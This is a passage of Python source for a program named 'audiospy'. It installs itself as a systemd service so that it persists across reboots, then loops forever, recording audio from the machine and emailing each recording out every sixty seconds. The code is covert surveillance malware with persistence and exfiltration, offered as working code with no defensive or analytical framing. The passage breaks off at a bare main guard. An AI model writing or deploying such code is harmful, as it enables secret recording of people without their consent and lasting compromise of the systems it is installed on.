        elif platform.system() == 'Linux':
            service_name = 'audiospy'
            service_command = f'echo "[Unit]\nDescription=Audio Spy Service\n[Service]\nExecStart={sys.executable} -m {__name__}\nRestart=always\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/{service_name}.service'
            subprocess.run(service_command, shell=True)
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', service_name])
            subprocess.run(['systemctl', 'start', service_name])

    create_persistence()
    while True:
        record_audio(output_file)
        send_email(output_file)
        time.sleep(60)

if __name__ == "__main__":
